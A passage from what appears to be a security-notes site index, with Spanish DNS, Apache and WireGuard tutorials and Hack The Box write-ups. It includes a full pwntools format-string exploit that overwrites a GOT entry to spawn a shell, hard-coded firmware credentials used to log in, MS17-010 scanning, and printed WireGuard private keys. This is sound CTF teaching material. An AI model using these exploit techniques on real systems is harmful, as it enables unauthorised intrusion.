10.10.10.2\nwww     IN      A       10.10.10.2\n</code></pre> <p>Y creamos el siguiente archivo</p> <pre><code>sudo vim /etc/bind/zonas/db.10.10.10\n</code></pre> <pre><code>$TTL    1d ;\n@       IN      SOA     ns1.networld.cu admin.networld.cu. (\n                        20210222        ; Serial\n                        12h             ; Refresh\n                        15m             ; Retry\n                        3w              ; Expire\n                        2h      )       ; Negative Cache TTL\n;\n@      IN      NS      ns1.networld.cu.\n1      IN      PTR     www.networld.cu.\n</code></pre> <p>Comprobar los archivos de zona que acabamos de crear para ver si todo est\u00e1 bien.</p> <pre><code>sudo named-checkzone networld.cu /etc/bind/zonas/db.networld.cu\n</code></pre> <pre><code>sudo named-checkzone db.10.10.10.in-addr.arpa /etc/bind/zonas/db.10.10.10\n</code></pre> <p></p> <p>Reiniciamos nuevamente</p> <pre><code>sudo systemctl restart bind9\n</code></pre> <p>Comprobar funcionamiento desde el host cliente.</p> <pre><code>ping www.networld.cu\nping ns1.networld.cu\n</code></pre> <p></p>"},{"location":"articles/servidor-ubuntu/#5-configuracion-de-http","title":"5. Configuraci\u00f3n de HTTP","text":"<p>Para la instalaci\u00f3n del servicio HTTP, se va a utilizar Apache de Ubuntu, con lo cual para los pasos para instalar son muestran a continuaci\u00f3n.</p> <p>El siguiente comando es para instalar apache2.</p> <pre><code>sudo apt install apache2 -y\n</code></pre> <p>Para iniciar el servicio de apache se ejecuta el siguiente comando.</p> <pre><code>sudo systemctl start apache2\n</code></pre> <p>Para habilitar el servicio de apache2 ejecutamos el siguiente comando.</p> <pre><code>sudo systemctl enable apache2\n</code></pre> <p>Finalmente se comprueba si esta corriendo el servicio de apache.</p> <pre><code>sudo systemctl status apache2\n</code></pre> <p></p> <p>Luego para probar el servicio de HTTP y de DNS entramos desde la maquina cliente y probamos la URL <code>www.networld.cu</code>.</p> <p></p>"},{"location":"articles/wireguard/","title":"IMPLEMENTACI\u00d3N DE WIREGUARD ENTRE DOS CONTENEDORES DE DOCKER","text":"<p>En un servidor Ubuntu Server 22.04.4 LTS, se implementar\u00e1 una VPN utilizando Docker para establecer una conexi\u00f3n segura entre dos contenedores. Esta conexi\u00f3n se realizar\u00e1 mediante la tunelizaci\u00f3n de los contenedores a trav\u00e9s del protocolo VPN WireGuard.</p> <p> Versi\u00f3n del servidor de Ubuntu Server.</p>"},{"location":"articles/wireguard/#requisitos-previos","title":"Requisitos previos","text":"<ol> <li>Tener Docker instalado en tu sistema, se puede guiar de los anexos, que son gu\u00edas en formato digital para instalar Docker.</li> <li>Acceso a internet para descargar las im\u00e1genes de Docker necesarias.</li> <li>Conocimientos b\u00e1sicos de Docker y redes.</li> </ol> <p>Para conectar dos contenedores de Docker con una VPN de WireGuard, puedes seguir estos pasos:</p>"},{"location":"articles/wireguard/#1-crear-una-red-interna-de-docker","title":"1. Crear una red interna de Docker","text":"<p>Se cre\u00f3 una red para almacenar los dos contenedores de Docker y poder realizar la respectiva conectividad.</p> <pre><code>docker network create --driver bridge vpn-net\n</code></pre> <p></p>"},{"location":"articles/wireguard/#2-crear-los-contenedores","title":"2. Crear los contenedores","text":"<p>Se  configuran los dos contenedores, tanto para el servidor como para el cliente.</p> <p>Contenedor de Servidor</p> <pre><code>docker run -dit \\\n  --name server \\\n  --cap-add=NET_ADMIN \\\n  --cap-add=SYS_MODULE \\\n  -v server:/etc/wireguard \\\n  --network=vpn-net \\\n  --rm \\\n  linuxserver/wireguard\n</code></pre> <p>Contenedor de cliente</p> <pre><code>docker run -dit \\\n  --name client \\\n  --cap-add=NET_ADMIN \\\n  --cap-add=SYS_MODULE \\\n  --cap-add=SYS_PTRACE \\\n  -v client:/etc/wireguard \\\n  --network=vpn-net \\\n  --rm \\\n  linuxserver/wireguard\n</code></pre> <p>Se puede observar los dos contenedores en ejecuci\u00f3n. </p>"},{"location":"articles/wireguard/#3-configurar-el-servidor","title":"3. Configurar el servidor","text":"<p>Para generar las claves p\u00fablicas y privadas dentro del servidor, primero accede al contenedor del server. Luego, configura la red de VPN utilizando estas claves privada y publica. Accede al contenedor del servidor:</p> <pre><code>docker exec -it server /bin/bash\n</code></pre> <p>Genera una clave p\u00fablica y privada para el servidor:</p> <pre><code>wg genkey | tee /etc/wireguard/privatekey | wg pubkey &gt; /etc/wireguard/publickey\n</code></pre> <p> </p> <p>Configuramos ahora la interfaz de red wg0</p> <pre><code>[Interface]\nAddress=10.13.13.1/24\nPrivateKey=aCcGAmPrZIm5GJ+MHsGzbJ4vh5PKB43lplLbBZds0XU=\nListenPort=51820\n\n[Peer]\nPublicKey=+RiujZizA2g6m1szd+XUQGfEETQ3wkMFS+CzIdCQRjc=\nAllowedIPs=10.13.13.2/32\nEndpoint=172.19.0.3:51820\n</code></pre>"},{"location":"articles/wireguard/#4-configurar-el-cliente","title":"4. Configurar el cliente","text":"<p>Para generar las claves p\u00fablicas y privadas dentro del servidor, primero accede al contenedor del client. Luego, configura la red de VPN utilizando estas claves privada y publica. Igualmente accedemos al contenedor del cliente.</p> <pre><code>docker exec -it client /bin/bash\n</code></pre> <p>Genera una clave p\u00fablica y privada para el cliente:</p> <pre><code>wg genkey | tee /etc/wireguard/privatekey | wg pubkey &gt; /etc/wireguard/publickey\n</code></pre> <p></p> <p>Configuramos ahora la interfaz de red wg0</p> <pre><code>[Interface]\nAddress=10.13.13.2/24\nPrivateKey=8H8GNaW6PXNEnn/Jm/0JEKg4dq0YrmtA3ZydfLp7KmQ=\nListenPort=51820\n\n[Peer]\nPublicKey=xIfYNOGJRYyKe/d7p3wZ+dM8/jijMoeFcs9V3flRAik=\nAllowedIPs=10.13.13.1/32\nEndpoint=172.19.0.2:51820\n</code></pre>"},{"location":"articles/wireguard/#5-iniciar-la-vpn-en-el-servidor-y-el-cliente","title":"5. Iniciar la VPN en el servidor y el cliente","text":"<p>En el contenedor del servidor:</p> <pre><code>wg-quick up wg0\n</code></pre> <p></p> <p>En el contenedor del cliente:</p> <pre><code>wg-quick up wg0\n</code></pre> <p></p>"},{"location":"articles/wireguard/#6-verificacion-de-creacion-de-la-vpn","title":"6. Verificaci\u00f3n de creaci\u00f3n de la VPN","text":"<p>Conexi\u00f3n de la VPN en servidor </p> <p>Conexi\u00f3n de la VPN en el cliente  </p>"},{"location":"articles/wireguard/#7-verificar-la-conexion","title":"7. Verificar la conexi\u00f3n","text":"<p>Verificar env\u00edo de paquete ICMP desde el contenedor de servidor.</p> <pre><code>ping 10.13.13.2\n</code></pre> <p></p> <p>Verificar envi\u00f3 de paquete ICMP desde el contenedor de cliente.</p> <pre><code>ping 10.13.13.1\n</code></pre> <p></p>"},{"location":"articles/wireguard/#8-desactivar-la-vpn-creada-con-wireguard","title":"8. Desactivar la VPN creada con Wireguard","text":"<p>Para terminar de la conexi\u00f3n de la VPN entre los dos contenedores se debe de realizar el siguiente comando en el contenedor de Servidor y Cliente.</p> <pre><code>wg-quick down wg0\n</code></pre>"},{"location":"writeups/hackthebox/challenges/coding/primed-for-action/","title":"Primed for Action Challenge","text":""},{"location":"writeups/hackthebox/challenges/coding/primed-for-action/#context","title":"Context","text":"<p>Intelligence units have intercepted a list of numbers. They seem to be used in a peculiar way: the adversary seems to be sending a list of numbers, most of which are garbage, but two of which are prime. These 2 prime numbers appear to form a key, which is obtained by multiplying the two. Your answer is the product of the two prime numbers. Find the key and help us solve the case.</p>"},{"location":"writeups/hackthebox/challenges/coding/primed-for-action/#solution","title":"Solution","text":""},{"location":"writeups/hackthebox/challenges/coding/primed-for-action/#requirements","title":"Requirements","text":"<ul> <li>python</li> </ul>"},{"location":"writeups/hackthebox/challenges/coding/primed-for-action/#step-1-analyze-the-code","title":"Step 1 - Analyze the code","text":"<p>The code gives us a list of numbers, which are to search for prime numbers and when they are found, multiply the two numbers.</p> <pre><code>4291 4038 403 2832 4323 3368 2607 2571 1527 1205 1929 1092 2883 4658 1379 4152 2148 294 1573 2584 2990 3244 254 2210 544 670 4047 3942 1446 217 3822 3114 3075 4877 3321 4459 4514 4364 1881 2958 1456 375 2911 1917 3861 3753 4311 3577 3149 3467\n</code></pre>"},{"location":"writeups/hackthebox/challenges/coding/primed-for-action/#step-2-create-code-python","title":"Step 2 - Create code python","text":"<p>In the following Python code, a search is performed for prime numbers in the list of prime numbers, and then when they are found, they are taken out in a sublist, and then they are multiplied.</p> <pre><code># calculate answer\ndef cal_prime(n):\n    if n &lt; 2:\n        return False\n    for i in range (2, int(n**0.5) + 1):\n        if n % i == 0:\n            return False\n    return True\n\n# take in the number\nn = input()\n\n# List numbers\nnumbers = list(map(int, n.split()))\n\n# Find prime list\nprime_numbers = [num for num in numbers if cal_prime(num)]\n\n# Cal product prime\nif len(prime_numbers) == 2:\n    product = prime_numbers[0] * prime_numbers[1]\n    print(product)\nelse:\n    print(\"Does not comply.\")\n</code></pre> <p>The output shows us the list of numbers.</p> <pre><code>4291 4038 403 2832 4323 3368 2607 2571 1527 1205 1929 1092 2883 4658 1379 4152 2148 294 1573 2584 2990 3244 254 2210 544 670 4047 3942 1446 217 3822 3114 3075 4877 3321 4459 4514 4364 1881 2958 1456 375 2911 1917 3861 3753 4311 3577 3149 3467\n</code></pre> <p>In the end, the result of the multiplication that leads us to the challenge flag.</p> <pre><code>16908559\n</code></pre>"},{"location":"writeups/hackthebox/challenges/coding/primed-for-action/#step-3-flag","title":"Step 3 - Flag","text":"<pre><code>HTB{pr1m3_Pr0}\n</code></pre>"},{"location":"writeups/hackthebox/challenges/coding/primed-for-action/#step-4-conclusion","title":"Step 4 - Conclusion","text":"<p>In this challenge, the programming part was practiced and the ability to identify the reasoning logic of prime numbers was achieved.</p>"},{"location":"writeups/hackthebox/challenges/hardware/the-needle/","title":"The Needle Challenge","text":""},{"location":"writeups/hackthebox/challenges/hardware/the-needle/#context","title":"Context","text":"<p>In this challenge, you must analyze a binary, which comes from a device, which is a firmware for security tests, so you must find the flag within this file.</p> <p>Challenge description:</p> <p>As a part of our SDLC process, we've got our firmware ready for security testing. Can you help us by performing a security assessment?</p>"},{"location":"writeups/hackthebox/challenges/hardware/the-needle/#solution","title":"Solution","text":""},{"location":"writeups/hackthebox/challenges/hardware/the-needle/#requirements","title":"Requirements","text":"<ul> <li>file</li> <li>binwalk</li> <li>grep</li> <li>find</li> </ul>"},{"location":"writeups/hackthebox/challenges/hardware/the-needle/#step-1-security-analysis","title":"Step 1 - Security analysis","text":"<p>A quick search of the binary properties revealed the following characteristics, where it can be seen that it is a file for Linux, with an ARM kernel.</p> <pre><code>file firmware.bin      \nfirmware.bin: Linux kernel ARM boot executable zImage (kernel &gt;=v3.17, &lt;v4.15) (big-endian, BE-32, ARMv5)\n</code></pre>"},{"location":"writeups/hackthebox/challenges/hardware/the-needle/#step-2-analysis-with-binwalk","title":"Step 2 - Analysis with Binwalk","text":"<p>To analyze this file, we use <code>Binwalk</code>, a tool that helps us analyze the code in this file, searching for hidden files. This tool then extracts information that is obfuscated or contained within the file.</p> <pre><code>binwalk -e firmware.bin\n</code></pre> <p>The following information can be observed, where there is a directory called <code>_firmware.bin.extracted</code>.</p> <pre><code>binwalk -e firmware.bin\n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n14419         0x3853          xz compressed data\n14640         0x3930          xz compressed data\n</code></pre> <p>When you enter and look at its contents, you can see several files.</p> <pre><code>\u279c ls\nfirmware.bin  _firmware.bin.extracted\n\u279c ls _firmware.bin.extracted \n3853.xz  3930  3930.xz  83948.squashfs  squashfs-root  squashfs-root-0\n</code></pre>"},{"location":"writeups/hackthebox/challenges/hardware/the-needle/#step-3-using-grep","title":"Step 3 - Using grep","text":"<p>We then use grep to search for any matching credentials, users, or directories that were used when configuring the firmware, performing a specific search for the word <code>login</code>, where something in particular is found. The respective user was found with a specific directory <code>Device_Admin:$sign</code>,</p> <pre><code>\u279c grep -rn \"./\" -e login\n\ngrep: ./_firmware.bin.extracted/squashfs-root/sbin/rpcd: binary file matches\n./_firmware.bin.extracted/squashfs-root/etc/inittab:3:::askconsole:/usr/libexec/login.sh\n./_firmware.bin.extracted/squashfs-root/etc/config/rpcd:2:config login\n./_firmware.bin.extracted/squashfs-root/etc/scripts/telnetd.sh:7:       if [ -f \"/usr/sbin/login\" ]; then\n./_firmware.bin.extracted/squashfs-root/etc/scripts/telnetd.sh:9:               telnetd -l \"/usr/sbin/login\" -u Device_Admin:$sign      -i $lf &amp;\n./_firmware.bin.extracted/squashfs-root/etc/profile:40:in order to prevent unauthorized SSH logins.\n./_firmware.bin.extracted/squashfs-root/lib/upgrade/common.sh:133:                              *procd*|*ash*|*init*|*watchdog*|*ssh*|*dropbear*|*telnet*|*login*|*hostapd*|*wpa_supplicant*|*nas*|*relayd*) : ;;\n./_firmware.bin.extracted/squashfs-root/lib/preinit/99_10_failsafe_login:5:failsafe_netlogin () {\n./_firmware.bin.extracted/squashfs-root/lib/preinit/99_10_failsafe_login:12:    ash --login\n./_firmware.bin.extracted/squashfs-root/lib/preinit/99_10_failsafe_login:13:    echo \"Please reboot system when done with failsafe network logins\"\n./_firmware.bin.extracted/squashfs-root/lib/preinit/99_10_failsafe_login:17:boot_hook_add failsafe failsafe_netlogin\ngrep: ./_firmware.bin.extracted/squashfs-root/lib/libc.so: binary file matches\ngrep: ./_firmware.bin.extracted/squashfs-root/usr/sbin/dropbear: binary file matches\ngrep: ./_firmware.bin.extracted/squashfs-root/usr/sbin/pppd: binary file matches\n./_firmware.bin.extracted/squashfs-root/usr/lib/opkg/info/busybox.list:3:/bin/login\n./_firmware.bin.extracted/squashfs-root/usr/lib/opkg/info/base-files.list:19:/usr/libexec/login.sh\n./_firmware.bin.extracted/squashfs-root/usr/lib/opkg/info/base-files.list:77:/lib/preinit/99_10_failsafe_login\n./_firmware.bin.extracted/squashfs-root/usr/lib/lua/luci/model/cbi/admin_system/admin.lua:78:ra = s:option(Flag, \"RootPasswordAuth\", translate(\"Allow root logins with password\"),\n./_firmware.bin.extracted/squashfs-root/usr/lib/lua/luci/model/cbi/admin_system/admin.lua:79:   translate(\"Allow the &lt;em&gt;root&lt;/em&gt; user to login with password\"))\n./_firmware.bin.extracted/squashfs-root/usr/libexec/login.sh:3:[ \"$(uci get system.@system[0].ttylogin)\" == 1 ] || exec /bin/ash --login\n./_firmware.bin.extracted/squashfs-root/usr/libexec/login.sh:5:exec /bin/login\n./_firmware.bin.extracted/squashfs-root/usr/share/rpcd/acl.d/unauthenticated.json:8:                                    \"login\"\ngrep: ./_firmware.bin.extracted/squashfs-root/bin/busybox: binary file matches\n./_firmware.bin.extracted/squashfs-root/bin/config_generate:231:                set system.@system[-1].ttylogin='0'\n</code></pre>"},{"location":"writeups/hackthebox/challenges/hardware/the-needle/#step-4-using-find","title":"Step 4 - Using find","text":"<p>Now we proceed to search for the name of this directory, using <code>find</code> to find the specific directory. We can see that it finds the address of the specific directory.</p> <pre><code>\u279c find ./ -name sign\n./_firmware.bin.extracted/squashfs-root/etc/config/sign\n</code></pre> <p>We proceed to analyze what this directory address contains, we observe that the file found is a text file, which possibly contains the content of a password.</p> <pre><code>\u279c file ./_firmware.bin.extracted/squashfs-root/etc/config/sign            \n./_firmware.bin.extracted/squashfs-root/etc/config/sign: ASCII text\n\u279c cat ./_firmware.bin.extracted/squashfs-root/etc/config/sign                     \nqS6-X/n]u&gt;fVfAt!\n</code></pre>"},{"location":"writeups/hackthebox/challenges/hardware/the-needle/#step-5-access-to-the-htb-system","title":"Step 5 - Access to the HTB system","text":"<p>You proceed to enter the system with the user and possible password <code>Device_Admin:qS6-X/n]u&gt;fVfAt!</code>, when you enter you can see the <code>flag.txt</code>.</p> <pre><code>\u279c nc 83.136.255.10 48456\n\n\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\nng-1591596-hwtheneedle-djvrn-6cfb57b64d-gljtm login: Device_Admin\nDevice_Admin\nPassword: qS6-X/n]u&gt;fVfAt!    \n\nng-1591596-hwtheneedle-djvrn-6cfb57b64d-gljtm:~$ ls       \nls\nflag.txt\nng-1591596-hwtheneedle-djvrn-6cfb57b64d-gljtm:~$\n</code></pre>"},{"location":"writeups/hackthebox/challenges/hardware/the-needle/#step-6-flag","title":"Step 6 - Flag","text":"<pre><code>ng-1591596-hwtheneedle-djvrn-6cfb57b64d-gljtm:~$ cat flag.txt\ncat flag.txt\n\nHTB{4_hug3_blund3r_d289a1_!!}\n</code></pre>"},{"location":"writeups/hackthebox/challenges/hardware/the-needle/#step-5-conclusion","title":"Step 5 - Conclusion","text":"<p>In this challenge, the importance of reading and finding hidden files was observed. Using the <code>binwalk</code> tool, a hidden directory was found, where several files could be seen that are used for firmware configurations. One of them contained the username and password to log into the system.</p>"},{"location":"writeups/hackthebox/challenges/pwn/r0bob1rd/","title":"R0bob1rd Challenge","text":""},{"location":"writeups/hackthebox/challenges/pwn/r0bob1rd/#context","title":"Context","text":"<p>This pwn challenge presents a 64-bit ELF binary named <code>r0bob1rd</code>, which implements interactive functionality for selecting and describing a <code>r0bob1rd</code>. Despite its innocent appearance, the program exhibits several classic C vulnerabilities, such as the use of raw <code>printf(buffer)</code> and the lack of proper validation when reading memory and user input.</p> <p>The objective of the challenge is to exploit a format string condition to dynamically overwrite the address of the GOT entry of <code>__stack_chk_fail</code>, initially to redirect execution back to <code>main()</code> and subsequently to a one_gadget in <code>libc</code> to obtain a shell. A custom version of <code>glibc</code> is used, which adds an extra layer of complexity to the environment.</p>"},{"location":"writeups/hackthebox/challenges/pwn/r0bob1rd/#solution","title":"Solution","text":""},{"location":"writeups/hackthebox/challenges/pwn/r0bob1rd/#requirements","title":"Requirements","text":"<ul> <li>checksec</li> <li>ghidra</li> <li>gdb</li> <li>one_gadget</li> </ul>"},{"location":"writeups/hackthebox/challenges/pwn/r0bob1rd/#step-1-check-the-binary-prote","title":"Step 1 - Check the binary prote","text":"<p>The <code>r0bob1rd</code> executable is provided along with a glibc/ directory containing a version-specific <code>libc</code> and its <code>loader (ld.so.2)</code>. Running file <code>r0bob1rd</code> gives us:</p> <pre><code>file r0bob1rd\n\nr0bob1rd: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./glibc/ld.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=c9a820fb2cb5f6e3fb6df9103ea375f00d80cf6c, not stripped\n</code></pre> <p>This indicates that the binary was compiled for a specific version of glibc and is not stripped, making it easier to analyze.</p> <p>The binary's protections are reviewed, giving us a preview of the steps to exploit this file.</p> <pre><code>pwn checksec r0bob1rd\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      Canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x400000)\n    RUNPATH:    b'./glibc/'\n    Stripped:   No\n</code></pre>"},{"location":"writeups/hackthebox/challenges/pwn/r0bob1rd/#step-2-analyze-the-code","title":"Step 2 - Analyze the code","text":"<p>When reviewing the code in Ghidra, it was found that there was an error in the <code>operation</code> function, where it could be observed that the <code>buffer</code> variable that at the beginning is declared with a value of 104, at the end it overflows by 106, a classic <code>printf(user_input)</code> vulnerability is also observed without protection for format strings, there is also a <code>Stack Canary</code>, and if it is overwritten, <code>__stack_chk_fail()</code> is called, this function is part of <code>GOT</code> and can be written thanks to <code>Partial RELRO</code>.</p> <pre><code>void operation(void)\n{\n  long in_FS_OFFSET;\n  int number;\n  char buffer [104];\n  long canary;\n\n  canary = *(long *)(in_FS_OFFSET + 40);\n  printf(\"\\nSelect a R0bob1rd &gt; \");\n  fflush(stdout);\n  __isoc99_scanf(&amp;DAT_00400eb5,&amp;number);\n  if ((number &lt; 0) || (9 &lt; number)) {\n    printf(\"\\nYou\\'ve chosen: %s\",robobirdNames + (long)number * 8);\n  }\n  else {\n    printf(\"\\nYou\\'ve chosen: %s\",*(undefined8 *)(robobirdNames + (long)number * 8));\n  }\n  getchar();\n  puts(\"\\n\\nEnter bird\\'s little description\");\n  printf(\"&gt; \");\n  fgets(buffer,106,stdin);\n  puts(\"Crafting..\");\n  usleep(2000000);\n  start_screen();\n  puts(\"[Description]\");\n  printf(buffer);\n  if (canary != *(long *)(in_FS_OFFSET + 40)) {\n                    /* WARNING: Subroutine does not return */\n    __stack_chk_fail();\n  }\n  return;\n}\n</code></pre>"},{"location":"writeups/hackthebox/challenges/pwn/r0bob1rd/#step-3-exploit-strategy","title":"Step 3 - Exploit Strategy","text":"<p>Exploring the packets in this <code>one_gadget</code> process, we found the second candidate. As you can see below, R15 points to null and RDX is not -&gt; <code>0x1</code>. However, another OR condition indicates that if RDX is an envp, we can use it.</p> <ul> <li>To verify this, we can simply run break in main and then query -&gt; <code>x/s *(char **) $rdx.</code></li> </ul> <pre><code>one_gadget glibc/libc.so.6\n\n0xe3afe execve(\"/bin/sh\", r15, r12)\nconstraints:\n  [r15] == NULL || r15 == NULL || r15 is a valid argv\n  [r12] == NULL || r12 == NULL || r12 is a valid envp\n\n0xe3b01 execve(\"/bin/sh\", r15, rdx)\nconstraints:\n  [r15] == NULL || r15 == NULL || r15 is a valid argv\n  [rdx] == NULL || rdx == NULL || rdx is a valid envp\n\n0xe3b04 execve(\"/bin/sh\", rsi, rdx)\nconstraints:\n  [rsi] == NULL || rsi == NULL || rsi is a valid argv\n  [rdx] == NULL || rdx == NULL || rdx is a valid envp\n</code></pre>"},{"location":"writeups/hackthebox/challenges/pwn/r0bob1rd/#step-4-create-the-script","title":"Step 4 - Create the script","text":"<p>The script seeks to filter a libc address using <code>format string</code>, then enter to calculate the base of <code>libc</code>, and overwrite <code>__stack_chk_fail@GOT</code> with the address of a <code>one_gadget</code>, thereby triggering the stack smash and gaining execution, which will allow us to read the flag.</p> <pre><code>from pwn import *\nimport os\n\nos.system(\"clear\")\n\n\ndef start(argv=[], *a, **kw):\n    if args.REMOTE:\n        return remote(sys.argv[1], sys.argv[2], *a, **kw)\n    elif args.GDB:\n        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)\n    else:\n        return process([exe] + argv, *a, **kw)\n\n\ngdbscript = \"\"\"\ncontinue\n\"\"\"\n\nexe = \"./r0bob1rd\"\nelf = context.binary = ELF(exe, checksec=True)\ncontext.log_level = \"INFO\"\n\nlibrary = \"glibc/libc.so.6\"\nlibc = context.binary = ELF(library, checksec=False)\n\nsh = start()\n\n## STAGE 1: Leak and Parse LIBC Runtime Leak + Relocate LIBC Base\n\nsh.sendlineafter(b\"&gt;\", b\"-8\")\n\nsh.recvuntil(b\"sen: \")\nget = unpack(sh.recv(6) + b\"\\x00\" * 2)\nlog.info(f\"RECEIVED --&gt; {hex(get)}\")\nlibc.address = get - libc.sym[\"setvbuf\"]\nlog.success(f\"LIBC BASE -&gt; {hex(libc.address)}\")\n\ngadgets = (0xE3AFE, 0xE3B01, 0xE3B04)\none_gadget = libc.address + gadgets[1]\nlog.success(f\"ONE GADGET --&gt; {hex(one_gadget)}\")\n\n## STAGE 2: Overwrite _stack_chk_fail() + Trigger it\n\npayload = fmtstr_payload(\n    8, {elf.got[\"__stack_chk_fail\"]: one_gadget}, write_size=\"short\"\n)\n\nsh.sendlineafter(b\"&gt;\", payload.ljust(106, b\"\\x90\"))\n# gdb.attach(sh)\n\nsh.interactive()\n</code></pre>"},{"location":"writeups/hackthebox/challenges/pwn/r0bob1rd/#step-5-flag","title":"Step 5 - Flag","text":"<pre><code>$ cat flag.txt\nHTB{S0m3t1m3s_bl0w1ng_th3_pr0gr4m_1s_g00d}\n</code></pre>"},{"location":"writeups/hackthebox/machines/blue/","title":"Blue","text":""},{"location":"writeups/hackthebox/machines/blue/#informacion-maquina","title":"Informaci\u00f3n maquina","text":"Par\u00e1metros Caracter\u00edsticas OS Windows Dificultad Easy Creador ch4p Link Blue"},{"location":"writeups/hackthebox/machines/blue/#introduccion","title":"Introducci\u00f3n","text":"<p>Blue es un CTF disponible en diversas plataformas, conocido por su dificultad f\u00e1cil. En esta m\u00e1quina, se requiere explotar la vulnerabilidad MS17-010 para obtener una shell con privilegios de System. A lo largo del proceso, aprenderemos a enumerar la vulnerabilidad MS17-010 en la m\u00e1quina utilizando Nmap, en una primera instancia se utilizara  Metasploit, y tambi\u00e9n se realizara escalamiento de privilegios a nivel de administrador con un script en Python.</p>"},{"location":"writeups/hackthebox/machines/blue/#requisitos-previos","title":"Requisitos previos","text":"<p>Creamos directorios para poder almacenar los diferentes archivos de trabajo maquina.</p> <pre><code>&gt; mkdir nmap content script exploits\n&gt; export blue=\"10.129.230.92\"\n</code></pre>"},{"location":"writeups/hackthebox/machines/blue/#reconocimiento","title":"Reconocimiento","text":"<p>Para ver a que tipo de maquina estamos explorando, realizamos una traza ICMP hacia la maquina y como se puede observar el TTL es de 127, que esta en el rango de una maquina Windows.</p> <p></p> <p>Realizamos el respectivo reconocimiento con <code>nmap</code>.</p> <pre><code>nmap -p- -sV -sC --open -sS -vvv -Pn $blue -oN escaneo\n</code></pre> <p>Al finalizar obtenemos el siguiente escaneo, donde se puede observar los puertos que se tienen abiertos a nivel de maquina, los cuales en este caso nos interesan los puertos 135, 139, 445.</p> <pre><code>Nmap scan report for 10.129.230.92\nHost is up, received user-set (0.098s latency).\nScanned at 2024-05-26 15:54:06 EDT for 104s\nNot shown: 65447 closed tcp ports (reset), 79 filtered tcp ports (no-response)\nSome closed ports may be reported as filtered due to --defeat-rst-ratelimit\nPORT      STATE SERVICE      REASON          VERSION\n135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC\n139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn\n445/tcp   open  microsoft-ds syn-ack ttl 127 Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)\n49152/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC\n49153/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC\n49154/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC\n49155/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC\n49156/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC\n49157/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC\nService Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb-os-discovery: \n|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)\n|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional\n|   Computer name: haris-PC\n|   NetBIOS computer name: HARIS-PC\\x00\n|   Workgroup: WORKGROUP\\x00\n|_  System time: 2024-05-26T20:55:46+01:00\n| p2p-conficker: \n|   Checking for Conficker.C or higher...\n|   Check 1 (port 23691/tcp): CLEAN (Couldn't connect)\n|   Check 2 (port 4775/tcp): CLEAN (Couldn't connect)\n|   Check 3 (port 25778/udp): CLEAN (Timeout)\n|   Check 4 (port 58031/udp): CLEAN (Failed to receive data)\n|_  0/4 checks are positive: Host is CLEAN or ports are blocked\n| smb2-time: \n|   date: 2024-05-26T19:55:44\n|_  start_date: 2024-05-26T19:48:46\n| smb-security-mode: \n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n|_clock-skew: mean: -19m56s, deviation: 34m36s, median: 1s\n| smb2-security-mode: \n|   2:1:0: \n|_    Message signing enabled but not required\n\nRead data files from: /usr/bin/../share/nmap\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n</code></pre> <p>Como se puede observar, el servicio <code>smb</code> est\u00e1 presente, lo cual es muy com\u00fan en los servicios de Windows. Adem\u00e1s, hay otros puertos abiertos t\u00edpicos de un servidor de Windows. Hemos logrado obtener informaci\u00f3n sobre la versi\u00f3n del sistema operativo de la m\u00e1quina, que es <code>Windows 7 Professional</code>.</p> <p>Se conoce que el protocolo <code>smb</code> utiliza el puerto <code>445</code>. En este laboratorio, nos enfocaremos en escalar privilegios mediante este protocolo.</p>"},{"location":"writeups/hackthebox/machines/blue/#enumeracion-de-smb","title":"Enumeraci\u00f3n de SMB","text":"<p>Realizamos un escaneo al protocolo SMB, que es com\u00fanmente utilizado por los sistemas Windows para compartir archivos, impresoras y otros recursos en la red. Ejecutamos todos los scripts de <code>nmap</code> para <code>smb-vuln</code>, los cuales buscan vulnerabilidades conocidas en servicios SMB. Tambi\u00e9n utilizamos el escaneo <code>-sT</code> para conexi\u00f3n TCP, un m\u00e9todo m\u00e1s confiable en comparaci\u00f3n con otros tipos de escaneo. Sin embargo, este m\u00e9todo es m\u00e1s lento y puede ser detectado por sistemas de seguridad. En este caso, optamos por este tipo de escaneo para identificar las vulnerabilidades presentes.</p> <pre><code>nmap -p445 -script=smb-vuln-\\* -sT $blue -oN smbScan\n</code></pre> <p>Obtenemos la siguiente salida al ejecutar el comando y podemos observar la vulnerabilidad que podemos utilizar para explotar este servicio.</p> <pre><code>Nmap scan report for 10.129.230.92\nHost is up (0.097s latency).\n\nPORT    STATE SERVICE\n445/tcp open  microsoft-ds\n\nHost script results:\n|_smb-vuln-ms10-054: false\n| smb-vuln-ms17-010: \n|   VULNERABLE:\n|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)\n|     State: VULNERABLE\n|     IDs:  CVE:CVE-2017-0143\n|     Risk factor: HIGH\n|       A critical remote code execution vulnerability exists in Microsoft SMBv1\n|        servers (ms17-010).\n|           \n|     Disclosure date: 2017-03-14\n|     References:\n|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143\n|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx\n|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND\n</code></pre> <p>Se puede observar al finalizar el escaneo, que posee una 